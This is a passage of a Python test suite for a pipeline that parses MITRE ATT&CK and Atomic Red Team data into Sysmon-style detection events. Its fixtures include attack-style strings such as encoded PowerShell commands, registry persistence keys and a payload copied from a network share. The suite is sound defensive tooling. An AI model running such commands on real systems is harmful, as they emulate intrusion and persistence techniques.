"""
test_atomic_pipeline.py

Run with:
    pytest tests/test_atomic_pipeline.py -v

Each test class maps to one module. Failures include the exact input/output
so you can debug without adding print statements.

Integration tests (marked with @pytest.mark.integration) require actual
files on disk and are skipped if they're not found.
"""

import json
import pytest
import tempfile
from pathlib import Path
from dataclasses import dataclass

import yaml

# ── These are all pure-function tests; no LLM calls are made ─────────────────


# =============================================================================
# FIXTURES
# =============================================================================

@pytest.fixture
def minimal_stix_bundle(tmp_path) -> Path:
    """Write a minimal STIX bundle to tmp_path and return the path."""
    bundle = {
        "type": "bundle",
        "spec_version": "2.1",
        "objects": [
            # Valid technique — process creation
            {
                "type": "attack-pattern",
                "name": "PowerShell",
                "x_mitre_deprecated": False,
                "revoked": False,
                "external_references": [
                    {"source_name": "mitre-attack", "external_id": "T1059.001"}
                ],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "execution"}
                ],
                "x_mitre_data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution",
                ],
                "x_mitre_permissions_required": ["User"],
            },
            # Parent technique (for subtechnique fallback test)
            {
                "type": "attack-pattern",
                "name": "Command and Scripting Interpreter",
                "x_mitre_deprecated": False,
                "revoked": False,
                "external_references": [
                    {"source_name": "mitre-attack", "external_id": "T1059"}
                ],
                "kill_chain_phases": [
                    {"kill_chain_name": "mitre-attack", "phase_name": "execution"}
                ],
                "x_mitre_data_sources": ["Process: Process Creation"],
                "x_mitre_permissions_required": ["User"],
            },
            # Deprecated technique — should be excluded
            {
                "type": "attack-pattern",
                "name": "Deprecated Technique",
                "x_mitre_deprecated": True,
                "revoked": False,
                "external_references": [
                    {"source_name": "mitre-attack", "external_id": "T9999"}
                ],
                "kill_chain_phases": [],
                "x_mitre_data_sources": [],
                "x_mitre_permissions_required": [],
            },
            # Non-technique object — should be ignored
            {
                "type": "course-of-action",
                "name": "Should be ignored",
            },
        ],
    }
    stix_path = tmp_path / "enterprise-attack.json"
    stix_path.write_text(json.dumps(bundle))
    return stix_path


@pytest.fixture
def minimal_atomic_yaml(tmp_path) -> Path:
    """Write a minimal atomic YAML to tmp_path/T1059.001/ and return the dir."""
    technique_id = "T1059.001"
    tech_dir = tmp_path / technique_id
    tech_dir.mkdir()

    data = {
        "attack_technique": technique_id,
        "display_name": "PowerShell",
        "atomic_tests": [
            # Valid windows test
            {
                "name": "Valid PowerShell test",
                "auto_generated_guid": "aaaa-1111",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": 'powershell.exe -enc SQBFAFgA',
                    "elevation_required": False,
                },
                "input_arguments": {
                    "script_path": {
                        "description": "Path to script",
                        "type": "path",
                        "default": "C:\\payload.ps1",
                    }
                },
            },
            # Should be filtered: non-windows
            {
                "name": "Linux only test",
                "auto_generated_guid": "bbbb-2222",
                "supported_platforms": ["linux"],
                "executor": {
                    "name": "sh",
                    "command": "sh -c 'id'",
                    "elevation_required": False,
                },
            },
            # Should be filtered: manual executor
            {
                "name": "Manual test",
                "auto_generated_guid": "cccc-3333",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "manual",
                    "steps": "Do something manually",
                },
            },
            # Should be filtered: empty command
            {
                "name": "Empty command test",
                "auto_generated_guid": "dddd-4444",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": "",
                    "elevation_required": False,
                },
            },
        ],
    }

    yaml_path = tech_dir / f"{technique_id}.yaml"
    yaml_path.write_text(yaml.dump(data))
    return tmp_path


@pytest.fixture
def sample_metadata():
    from pipeline.data.stix_loader import MITREMetadata
    return MITREMetadata(
        technique_id="T1059.001",
        technique_name="PowerShell",
        tactic="execution",
        tactics=["execution"],
        data_sources=["Process: Process Creation"],
        permissions_required=["User"],
    )


@pytest.fixture
def sample_atomic_test():
    from pipeline.data.atomic_loader import AtomicTest, InputArgument
    return AtomicTest(
        technique_id="T1059.001",
        test_guid="test-guid-001",
        test_name="Test PowerShell execution",
        description="Runs powershell with encoded command",
        executor_name="powershell",
        command='powershell.exe -enc SQBFAFgA',
        elevation_required=False,
        input_arguments=[],
        supported_platforms=["windows"],
    )


# =============================================================================
# STIX LOADER TESTS
# =============================================================================

class TestSTIXLoader:
    def test_valid_technique_lookup(self, minimal_stix_bundle):
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(minimal_stix_bundle)
        result = loader.lookup("T1059.001")

        assert result is not None, "Expected metadata for T1059.001"
        assert result.technique_id == "T1059.001"
        assert result.technique_name == "PowerShell"
        assert result.tactic == "execution"
        assert "Process: Process Creation" in result.data_sources

    def test_unknown_technique_returns_none(self, minimal_stix_bundle):
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(minimal_stix_bundle)
        result = loader.lookup("T9998")

        assert result is None, f"Expected None for unknown technique, got {result}"

    def test_subtechnique_falls_back_to_parent(self, minimal_stix_bundle):
        """T1059.999 is not in fixture but T1059 is — should return T1059."""
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(minimal_stix_bundle)
        result = loader.lookup("T1059.999")

        assert result is not None, "Expected fallback to parent T1059"
        assert result.technique_id == "T1059", (
            f"Expected T1059 as fallback, got {result.technique_id}"
        )

    def test_deprecated_technique_excluded(self, minimal_stix_bundle):
        """T9999 is marked x_mitre_deprecated=True and should not be indexed."""
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(minimal_stix_bundle)
        result = loader.lookup("T9999")

        assert result is None, (
            f"Deprecated technique T9999 should not be returned, got {result}"
        )

    def test_loader_indexes_only_attack_patterns(self, minimal_stix_bundle):
        """course-of-action and other types should be ignored."""
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(minimal_stix_bundle)
        # 2 valid techniques in fixture (T1059.001 and T1059), 1 deprecated, 1 non-technique
        assert loader.technique_count == 2, (
            f"Expected 2 indexed techniques, got {loader.technique_count}"
        )

    def test_missing_stix_file_raises(self, tmp_path):
        from pipeline.data.stix_loader import get_loader
        loader = get_loader(tmp_path / "nonexistent.json")
        with pytest.raises(FileNotFoundError):
            loader.lookup("T1059.001")


# =============================================================================
# ATOMIC LOADER TESTS
# =============================================================================

class TestAtomicLoader:
    def test_loads_valid_windows_test(self, minimal_atomic_yaml):
        from pipeline.data.atomic_loader import load_tests_for_technique
        tests = load_tests_for_technique("T1059.001", minimal_atomic_yaml)

        assert len(tests) == 1, (
            f"Expected 1 valid test, got {len(tests)}: {[t.test_name for t in tests]}"
        )
        assert tests[0].test_name == "Valid PowerShell test"

    def test_filters_non_windows_platform(self, minimal_atomic_yaml):
        from pipeline.data.atomic_loader import load_tests_for_technique
        tests = load_tests_for_technique("T1059.001", minimal_atomic_yaml)
        names = [t.test_name for t in tests]

        assert "Linux only test" not in names, (
            "Non-windows test should have been filtered"
        )

    def test_filters_manual_executor(self, minimal_atomic_yaml):
        from pipeline.data.atomic_loader import load_tests_for_technique
        tests = load_tests_for_technique("T1059.001", minimal_atomic_yaml)
        names = [t.test_name for t in tests]

        assert "Manual test" not in names, (
            "Manual executor test should have been filtered"
        )

    def test_filters_empty_command(self, minimal_atomic_yaml):
        from pipeline.data.atomic_loader import load_tests_for_technique
        tests = load_tests_for_technique("T1059.001", minimal_atomic_yaml)
        names = [t.test_name for t in tests]

        assert "Empty command test" not in names, (
            "Test with empty command should have been filtered"
        )

    def test_parses_input_arguments(self, minimal_atomic_yaml):
        from pipeline.data.atomic_loader import load_tests_for_technique
        tests = load_tests_for_technique("T1059.001", minimal_atomic_yaml)

        assert tests[0].input_arguments, "Expected input_arguments to be parsed"
        arg = tests[0].input_arguments[0]
        assert arg.name == "script_path"
        assert arg.arg_type == "path"
        assert arg.default == "C:\\payload.ps1"

    def test_missing_yaml_returns_empty_list(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique
        result = load_tests_for_technique("T9999", tmp_path)

        assert result == [
        ], f"Expected empty list for missing YAML, got {result}"


# =============================================================================
# ATOMIC CLEANER TESTS
# =============================================================================

class TestAtomicCleaner:
    """All tests here are pure function tests — no file I/O."""

    # ── Variable resolution ──────────────────────────────────────────────────

    def test_resolves_atomic_input_args(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest, InputArgument
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001",
            test_guid="x",
            test_name="Test input arg resolution",
            description="",
            executor_name="powershell",
            command='powershell.exe -File #{script_path}',
            elevation_required=False,
            input_arguments=[
                InputArgument("script_path", "path to script",
                              "path", "C:\\payload.ps1")
            ],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert any("C:\\payload.ps1" in cmd for cmd in result.commands), (
            f"Expected resolved path in commands, got: {result.commands}"
        )
        assert not result.has_unresolved_vars, (
            "No unresolved vars expected after resolution"
        )

    def test_resolves_env_appdata(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="env appdata test", description="",
            executor_name="powershell",
            command='Copy-Item payload.ps1 "$env:APPDATA\\payload.ps1"',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert any("AppData\\Roaming" in cmd for cmd in result.commands), (
            f"Expected $env:APPDATA resolved, got: {result.commands}"
        )

    def test_resolves_path_to_atomics_folder(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="atomics folder test", description="",
            executor_name="powershell",
            command='Copy-Item "$PathToAtomicsFolder\\T1059.001\\payload.ps1" C:\\temp\\',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert any("AtomicRedTeam" in cmd for cmd in result.commands), (
            f"Expected $PathToAtomicsFolder resolved, got: {result.commands}"
        )

    def test_longer_var_resolved_before_shorter(self, sample_metadata):
        """$env:ProgramFiles(x86) must not be partially matched by $env:ProgramFiles."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="var order test", description="",
            executor_name="command_prompt",
            command='cd "$env:ProgramFiles(x86)\\App"',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert any("Program Files (x86)" in cmd for cmd in result.commands), (
            f"Expected x86 path, got: {result.commands}"
        )
        assert not any("ProgramFiles(x86)" in cmd for cmd in result.commands), (
            f"Variable should be fully resolved, got: {result.commands}"
        )

    # ── Line joining ─────────────────────────────────────────────────────────

    def test_ps_backtick_continuation_joined(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="backtick test", description="",
            executor_name="powershell",
            command='New-Item -Path "HKCU:\\Software\\Test" `\n    -Name "Persist"',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert len(result.commands) == 1, (
            f"Backtick continuation should produce 1 command, got {len(result.commands)}: "
            f"{result.commands}"
        )
        assert "Persist" in result.commands[0], (
            f"Joined command should contain both parts, got: {result.commands[0]}"
        )

    def test_cmd_caret_continuation_joined(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="caret test", description="",
            executor_name="command_prompt",
            command='reg add "HKCU\\Software\\Test" ^\n    /v Persist /d 1 /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert len(result.commands) == 1, (
            f"Caret continuation should produce 1 command, got {len(result.commands)}: "
            f"{result.commands}"
        )

    # ── Command splitting ────────────────────────────────────────────────────

    def test_ps_semicolon_splits_commands(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="semicolon split test", description="",
            executor_name="powershell",
            command='$a = "hello"; $b = "world"; Write-Host "$a $b"',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert len(result.commands) == 3, (
            f"Expected 3 commands from semicolon split, got {len(result.commands)}: "
            f"{result.commands}"
        )

    def test_no_semicolon_split_inside_quotes(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="semicolon in quotes", description="",
            executor_name="powershell",
            command='reg add "HKCU\\Software" /d "value;with;semis" /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert len(result.commands) == 1, (
            f"Semicolons inside quotes should not split, got {len(result.commands)}: "
            f"{result.commands}"
        )

    def test_no_semicolon_split_for_cmd_executor(self, sample_metadata):
        """cmd.exe doesn't use semicolons as command separators."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="cmd no semicolon split", description="",
            executor_name="command_prompt",
            command='reg add "HKCU\\key" /d "a;b;c" /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert len(result.commands) == 1, (
            f"cmd executor should not split on semicolons, got: {result.commands}"
        )

    def test_ps_comment_lines_filtered(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="comment filter test", description="",
            executor_name="powershell",
            command='# This is a comment\npowershell.exe -enc SQBFAFgA',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert all(not cmd.startswith('#') for cmd in result.commands), (
            f"Comment lines should be filtered, got: {result.commands}"
        )

    def test_cmd_rem_lines_filtered(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="REM filter test", description="",
            executor_name="command_prompt",
            command='REM this is a comment\nreg add "HKCU\\key" /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert all("REM" not in cmd.upper()[:4] for cmd in result.commands), (
            f"REM lines should be filtered, got: {result.commands}"
        )

    # ── Special passthrough cases ────────────────────────────────────────────

    def test_base64_passes_through_intact(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="base64 test", description="",
            executor_name="powershell",
            command=f'powershell.exe -enc {b64}',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert any(b64 in cmd for cmd in result.commands), (
            f"Base64 payload should be preserved, got: {result.commands}"
        )

    def test_unc_path_not_flagged_as_unresolved(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="UNC path test", description="",
            executor_name="command_prompt",
            command='copy \\\\SERVER\\share\\payload.exe C:\\temp\\payload.exe',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert not result.has_unresolved_vars, (
            f"UNC path should not be flagged as unresolved, got: {result.commands}"
        )

    def test_unresolved_atomic_var_flagged(self, sample_metadata):
        """#{unresolved} with no matching input_argument — should flag, not drop."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="unresolved var test", description="",
            executor_name="powershell",
            command='Invoke-Something #{unknown_param}',
            elevation_required=False, input_arguments=[],  # no matching arg
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None, "Test with unresolved vars should NOT be dropped"
        assert result.has_unresolved_vars, (
            "has_unresolved_vars should be True when #{...} remains"
        )

    # ── Formatted output ─────────────────────────────────────────────────────

    def test_elevation_reflected_in_formatted_input(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="elevation test", description="",
            executor_name="powershell",
            command='powershell.exe -enc SQBFAFgA',
            elevation_required=True,
            input_arguments=[], supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert "Elevation Required: Yes" in result.formatted_input, (
            f"Elevation not reflected in formatted_input:\n{result.formatted_input}"
        )

    def test_executor_image_mapped_correctly(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        for executor, expected_image in [
            ("powershell",     "powershell.exe"),
            ("command_prompt", "cmd.exe"),
        ]:
            test = AtomicTest(
                technique_id="T1059.001", test_guid="x",
                test_name=f"executor {executor}", description="",
                executor_name=executor,
                command='whoami',
                elevation_required=False, input_arguments=[],
                supported_platforms=["windows"],
            )
            result = clean_test(test, sample_metadata)
            assert result is not None
            assert result.executor_image == expected_image, (
                f"executor={executor} → expected {expected_image}, "
                f"got {result.executor_image}"
            )

    def test_formatted_input_contains_required_sections(self, sample_metadata, sample_atomic_test):
        from pipeline.data.atomic_cleaner import clean_test

        result = clean_test(sample_atomic_test, sample_metadata)

        assert result is not None
        fi = result.formatted_input

        required_sections = ["Test:", "Technique:",
                             "Tactic:", "Executor:", "Commands:"]
        for section in required_sections:
            assert section in fi, (
                f"Missing '{section}' in formatted_input:\n{fi}"
            )

    def test_formatted_input_includes_mutation_manifest(self, sample_metadata):
        from pipeline.data.atomic_loader import AtomicTest, InputArgument
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="mutation manifest test", description="",
            executor_name="powershell",
            command='powershell.exe -File C:\\payload.ps1',
            elevation_required=False,
            input_arguments=[
                InputArgument("script_path", "path to script",
                              "path", "C:\\payload.ps1")
            ],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)

        assert result is not None
        assert "Input Variables" in result.formatted_input, (
            f"Mutation manifest section missing:\n{result.formatted_input}"
        )
        assert "script_path" in result.formatted_input
        assert "path" in result.formatted_input


# =============================================================================
# PROCEDURE INTERPRETER TESTS (pure logic only — no LLM calls)
# =============================================================================

class TestProcedureInterpreterLogic:
    """
    Tests for the helper functions inside procedure_interpreter.
    LLM-calling functions (interpret_procedure) are NOT tested here.
    """

    def test_ground_fields_keeps_explicit_values(self):
        from pipeline.emulator.procedure_interpreter import _ground_fields

        fields = {"Image": "powershell.exe",
                  "CommandLine": "powershell.exe -enc SQBFAFgA"}
        text = "powershell.exe -enc SQBFAFgA was observed"
        result = _ground_fields(fields, text)

        assert "Image" in result
        assert "CommandLine" in result

    def test_ground_fields_drops_hallucinated_values(self):
        from pipeline.emulator.procedure_interpreter import _ground_fields

        fields = {
            "Image": "powershell.exe",
            "TargetObject": "HKCU\\FakeKey\\NotInText",
        }
        text = "powershell.exe was executed"
        result = _ground_fields(fields, text)

        assert "Image" in result
        assert "TargetObject" not in result, (
            "Hallucinated TargetObject should be dropped by grounding"
        )

    def test_ground_fields_passes_non_string_values(self):
        from pipeline.emulator.procedure_interpreter import _ground_fields

        fields = {"ProcessId": 1234, "Image": "calc.exe"}
        text = "calc.exe was launched"
        result = _ground_fields(fields, text)

        assert "ProcessId" in result, "Non-string values should pass through grounding"
        assert result["ProcessId"] == 1234

    def test_minimum_sysmon_process_creation(self):
        from pipeline.emulator.procedure_interpreter import _validate_minimum_sysmon_fields

        assert _validate_minimum_sysmon_fields(
            "process_creation", {"Image": "cmd.exe",
                                 "CommandLine": "cmd.exe /c whoami"}
        )
        assert not _validate_minimum_sysmon_fields(
            "process_creation", {"Image": "cmd.exe"}  # missing CommandLine
        )

    def test_minimum_sysmon_network_accepts_either_ip_or_hostname(self):
        from pipeline.emulator.procedure_interpreter import _validate_minimum_sysmon_fields

        assert _validate_minimum_sysmon_fields(
            "network", {"DestinationIp": "10.0.0.1"}
        )
        assert _validate_minimum_sysmon_fields(
            "network", {"DestinationHostname": "evil.example.com"}
        )
        assert not _validate_minimum_sysmon_fields(
            "network", {"DestinationPort": "443"}  # neither IP nor hostname
        )

    def test_minimum_sysmon_registry(self):
        from pipeline.emulator.procedure_interpreter import _validate_minimum_sysmon_fields

        assert _validate_minimum_sysmon_fields(
            "registry", {"TargetObject": "HKCU\\Software\\Persist"}
        )
        assert not _validate_minimum_sysmon_fields(
            "registry", {"Details": "some value"}  # missing TargetObject
        )

    def test_unknown_event_type_passes_minimum_check(self):
        from pipeline.emulator.procedure_interpreter import _validate_minimum_sysmon_fields

        # Should not crash or fail for unknown types
        assert _validate_minimum_sysmon_fields(
            "file_creation", {"TargetFilename": "x.exe"})

    def test_build_log_event_drops_low_confidence(self):
        from pipeline.emulator.procedure_interpreter import build_log_event

        result = build_log_event(
            {"confidence": "low", "EventID": 1,
                "event_type": "process_creation", "fields": {}},
            procedure_text="powershell.exe -enc SQBFAFgA",
        )
        assert result is None, "Low confidence should return None"

    def test_build_log_event_drops_missing_event_id(self):
        from pipeline.emulator.procedure_interpreter import build_log_event

        result = build_log_event(
            {"confidence": "high", "event_type": "process_creation", "fields": {}},
            procedure_text="powershell.exe -enc SQBFAFgA",
        )
        assert result is None, "Missing EventID should return None"

    def test_build_log_event_drops_ungrounded_fields(self):
        """All fields are hallucinated — none exist in procedure_text."""
        from pipeline.emulator.procedure_interpreter import build_log_event

        result = build_log_event(
            {
                "confidence": "high",
                "EventID": 1,
                "event_type": "process_creation",
                "fields": {
                    "Image":       "notintheprocedure.exe",
                    "CommandLine": "totally fabricated command",
                },
            },
            procedure_text="powershell.exe was run",
        )
        assert result is None, "All-ungrounded fields should return None"


# =============================================================================
# INTEGRATION TEST
# =============================================================================

class TestIntegration:
    """
    Full pipeline integration tests.
    Skipped automatically if real files are not present.
    """

    @pytest.mark.integration
    def test_full_pipeline_t1059_001(self):
        from pathlib import Path
        from pipeline.data.stix_loader import lookup_technique
        from pipeline.data.atomic_loader import load_tests_for_technique
        from pipeline.data.atomic_cleaner import clean_test

        atomics_root = Path(
            __file__).parents[1] / "data" / "atomic-red-team" / "atomics"
        stix_path = Path(__file__).parents[1] / \
            "data" / "mitre" / "enterprise-attack.json"

        if not atomics_root.exists():
            pytest.skip(f"Atomics repo not found at {atomics_root}")
        if not stix_path.exists():
            pytest.skip(f"STIX bundle not found at {stix_path}")

        technique_id = "T1059.001"
        metadata = lookup_technique(technique_id)
        assert metadata is not None, f"STIX lookup failed for {technique_id}"

        tests = load_tests_for_technique(technique_id, atomics_root)
        assert tests, f"No valid tests loaded for {technique_id}"

        cleaned = [clean_test(t, metadata) for t in tests]
        cleaned = [c for c in cleaned if c is not None]
        assert cleaned, "No tests survived cleaning"

        first = cleaned[0]
        print(f"\n[INTEGRATION] First cleaned test for {technique_id}:")
        print(f"  Test name:   {first.test_name}")
        print(f"  Executor:    {first.executor_image}")
        print(f"  Commands:    {first.commands}")
        print(f"  Unresolved:  {first.has_unresolved_vars}")
        print(f"\n  formatted_input:\n{first.formatted_input}")

        # Structural checks
        assert first.technique_id == technique_id
        assert first.executor_image.endswith(
            ".exe") or first.executor_image == "sh"
        assert len(first.commands) >= 1
        assert "Commands:" in first.formatted_input
        assert technique_id in first.formatted_input

# =============================================================================
# MALFORMED / CORRUPTED INPUT TESTS
# =============================================================================


class TestMalformedInput:
    """Guarantee the pipeline never crashes on bad data — just returns empty/None."""

    def test_yaml_syntax_error_returns_empty(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        # Deliberately broken YAML
        (tech_dir / "T1059.001.yaml").write_text(
            "atomic_tests:\n  - name: broken\n    bad: [unclosed"
        )
        result = load_tests_for_technique("T1059.001", tmp_path)
        assert result == [], f"Broken YAML should return [], got {result}"

    def test_yaml_missing_atomic_tests_key(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(
            yaml.dump({"attack_technique": "T1059.001",
                      "display_name": "PowerShell"})
        )
        result = load_tests_for_technique("T1059.001", tmp_path)
        assert result == [], "Missing atomic_tests key should return []"

    def test_yaml_atomic_tests_not_a_list(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(
            yaml.dump({"atomic_tests": "this should be a list"})
        )
        result = load_tests_for_technique("T1059.001", tmp_path)
        assert result == [], "atomic_tests as non-list should return []"

    def test_yaml_test_missing_executor_key(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
            "atomic_tests": [{
                "name": "No executor",
                "auto_generated_guid": "xxxx",
                "supported_platforms": ["windows"],
                # executor key entirely absent
            }]
        }))
        result = load_tests_for_technique("T1059.001", tmp_path)
        assert result == [], "Test missing executor key should be filtered"

    def test_yaml_executor_missing_command_key(self, tmp_path):
        from pipeline.data.atomic_loader import load_tests_for_technique

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
            "atomic_tests": [{
                "name": "No command",
                "auto_generated_guid": "xxxx",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "elevation_required": False,
                    # command key absent
                }
            }]
        }))
        result = load_tests_for_technique("T1059.001", tmp_path)
        assert result == [], "Test with no command field should be filtered"

    def test_yaml_input_arguments_malformed(self, tmp_path, sample_metadata):
        """input_arguments present but not a dict — should not crash, just return no args."""
        from pipeline.data.atomic_loader import load_tests_for_technique
        from pipeline.data.atomic_cleaner import clean_test

        tech_dir = tmp_path / "T1059.001"
        tech_dir.mkdir()
        (tech_dir / "T1059.001.yaml").write_text(yaml.dump({
            "atomic_tests": [{
                "name": "Bad input args",
                "auto_generated_guid": "xxxx",
                "supported_platforms": ["windows"],
                "executor": {
                    "name": "powershell",
                    "command": "powershell.exe -enc SQBFAFgA",
                    "elevation_required": False,
                },
                "input_arguments": ["this", "should", "be", "a", "dict"],
            }]
        }))
        tests = load_tests_for_technique("T1059.001", tmp_path)
        assert tests, "Should still load the test despite bad input_arguments"
        assert tests[0].input_arguments == [
        ], "Malformed input_arguments should be empty list"

        result = clean_test(tests[0], sample_metadata)
        assert result is not None, "Malformed input_arguments should not crash cleaner"

    def test_stix_bundle_empty_objects_array(self, tmp_path):
        from pipeline.data.stix_loader import get_loader

        stix_path = tmp_path / "empty.json"
        stix_path.write_text(json.dumps(
            {"type": "bundle", "spec_version": "2.1", "objects": []}))
        loader = get_loader(stix_path)
        assert loader.technique_count == 0
        assert loader.lookup("T1059.001") is None

    def test_stix_technique_missing_external_references(self, tmp_path):
        """Attack pattern with no external_references should be silently skipped."""
        from pipeline.data.stix_loader import get_loader

        bundle = {
            "type": "bundle", "spec_version": "2.1",
            "objects": [{
                "type": "attack-pattern",
                "name": "No refs",
                "x_mitre_deprecated": False,
                "revoked": False,
                # external_references absent → no technique ID → skip
            }]
        }
        stix_path = tmp_path / "bundle.json"
        stix_path.write_text(json.dumps(bundle))
        loader = get_loader(stix_path)
        assert loader.technique_count == 0, "Technique without external_references should be skipped"


# =============================================================================
# EDGE-CASE COMMAND PARSING
# =============================================================================

class TestEdgeCaseCommandParsing:

    def test_nested_double_quotes_in_cmd(self, sample_metadata):
        """cmd.exe reg add with a value containing double quotes."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="nested double quotes", description="",
            executor_name="command_prompt",
            command=r'reg add "HKCU\Software\Test" /v Key /d "\"quoted value\"" /f',
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None, "Nested double quotes should not crash cleaner"
        assert len(result.commands) == 1

    def test_single_quotes_containing_semicolons_not_split(self, sample_metadata):
        """PowerShell: semicolons inside single quotes are not separators."""
        from pipeline.data.atomic_loader import AtomicTest
        from pipeline.data.atomic_cleaner import clean_test

        test = AtomicTest(
            technique_id="T1059.001", test_guid="x",
            test_name="single quote semicolons", description="",
            executor_name="powershell",
            command="$x = 'value;with;semis'; Write-Host $x",
            elevation_required=False, input_arguments=[],
            supported_platforms=["windows"],
        )
        result = clean_test(test, sample_metadata)
        assert result is not None
        # $x = 'value;with;semis'  and  Write-Host $x  →  2 commands
        # the semicolons INSIDE single quotes must NOT be split
        assert not any("value" in c and "with" not in c for c in result.commands), (
            f"Single-quoted semicolons were incorrectly split: {result.commands}"
        )

    def test_double_escaped_backslash_in_registry_path(self, sample_metadata):
        """Registry paths with double backslashes should survive cleaning intact."""
